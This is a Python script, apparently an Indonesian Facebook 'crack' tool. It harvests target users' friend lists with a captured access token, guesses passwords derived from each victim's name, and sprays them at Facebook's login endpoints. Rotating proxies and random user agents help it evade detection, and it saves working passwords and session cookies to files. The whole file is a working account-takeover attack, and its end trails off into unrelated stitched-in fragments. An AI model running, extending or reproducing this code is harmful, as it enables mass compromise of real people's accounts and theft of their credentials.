#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mrenvvv_renvvv')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice([' en-gb; SM-', ' en-us; SM-' ])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	print(f"""(+) Simple Crack Facebook\n(+) Made By {M}Indonesian {P}Coder""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tCookies Capture Extension Suggestion : [green]Cookiedough[white]'))
		asu = random.choice([h])
		cookie=input(f'Enter Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	ip = requests.get("https://api.ipify.org").text
	renv_xy(f'>> Your Id  : '+str(my_id))
	renv_xy(f'>> Your Ip  : {ip}')
	print(f'>> Github   : https://github.com/RENVVV')
	print(f'>> Update   : Version Latest {H}2.0{x} ')
	print('')
	print(f'>> Select Menu{x}')
	print('')
	cetak('[white]1. Crack Public\n0. Exit[white]')
	_____renv__renv_____ = input('\n>> Select : ')
	print('')
	if _____renv__renv_____ in ['1']:
		dump_massal()
	elif _____renv__renv_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('>> input target amount ? : '))
	except ValueError:
		print('>> wrong input ')
		exit()
	if jum<1 or jum>100:
		print('>> Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> unstable signal ')
			exit()
	try:
		print('')
		print(f'Total Id Collected {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'\n{x}>> ID Order Setting ')
	print('')
	print(f'{x}1. Id Old To New ({M}Not Recommend{M}{x}){x} ')
	print(f'2. Id New To Old ({H}Recommended{H}{x}){x}  ')
	print(f'3. Id Random ({K}Very Recommended{K}{x}){x} ')
	print('')
	hu = input('Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> input correctly ')
		exit()
		print('')
		
	print('\n>> Input Metode URL Login ')
	print('')
	print(f'1. login from {B}m.facebook.com{x} (slow)')
	print(f'2. login from {B}free.facebook.com{x} (fast)')
	print(f'3. login from {B}mbasic.facebook.com{x} (semi fast + slow)')
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	pwplus=input('>> Add Password Manual ( Y/t ) ')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak('Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white] ')
		pwku=input('Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('')
	print(f'>> Results {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'>> Results {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print(f'>> Play Airplane Mode Every 500 ID\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					pwv.append(frs+'321')
					pwv.append(frs+'123')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					pwv.append(frs+'321')
					pwv.append(frs+'123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak('\t[cyan]>>[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')
	print('')
	print(f'{h} OK : {h}%s '%(ok))
	print(f'{k} CP : {k}%s{x} '%(cp))
	print('')
	print(f'\t{x}>>{k} Good Bye Thanks To Using My Script {x} << ')
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s%s/%s ok:%s/cp:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v7.0/dialog/oauth?display=popup&response_type=code&client_id=658686778541171&redirect_uri=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook&state=b9eb820b25d1c50ab896f860145238df&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=d214f965-77da-4e9e-8bff-793207c95801&tp=unspecified#_=_","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} * --> {x}{K}{idf}|{pw}')
				print(f'\r{x} * --> {x}{M}{ua}{M}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} * --> {H}{idf}|{pw}')
				print(f'\r{x} * --> {x}{H}{kuki}{H}')
				print(f'\r{x} * --> {x}{M}{ua}{M}\n')
				#print(f"{M}{ua}{M}\n")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				#os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-FREE-FB ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s%s/%s ok:%s/cp:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/v7.0/dialog/oauth?display=popup&response_type=code&client_id=658686778541171&redirect_uri=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook&state=b9eb820b25d1c50ab896f860145238df&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=d214f965-77da-4e9e-8bff-793207c95801&tp=unspecified#_=_","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} * --> {x}{K}{idf}|{pw}')
				print(f'\r{x} * --> {x}{M}{ua}{M}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} * --> {H}{idf}|{pw}')
				print(f'\r{x} * --> {x}{H}{kuki}{H}')
				print(f'\r{x} * --> {x}{M}{ua}{M}\n')
				#print(f"{M}{ua}{M}\n")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				#os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MBASIC ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s%s/%s ok:%s/cp:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/v7.0/dialog/oauth?display=popup&response_type=code&client_id=658686778541171&redirect_uri=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook&state=b9eb820b25d1c50ab896f860145238df&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=d214f965-77da-4e9e-8bff-793207c95801&tp=unspecified#_=_","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} * --> {x}{K}{idf}|{pw}')
				print(f'\r{x} * --> {x}{M}{ua}{M}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} * --> {H}{idf}|{pw}')
				print(f'\r{x} * --> {x}{H}{kuki}{H}')
				print(f'\r{x} * --> {x}{M}{ua}{M}\n')
				#print(f"{M}{ua}{M}\n")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				#os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> GITHUB.COM/RENVVV <<<<<#
# Author by HikmatXD
# Jangan Keras [:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		━━━━━┫
\t\t\t┃       ａｍｂｆ       ┃
\t\t\t┃ Author : Redho Ganz  ┃
\t\t\t┗━━━━━━━━━━━━━━━━━━━━━━┛
""")

def cek_expired_script():
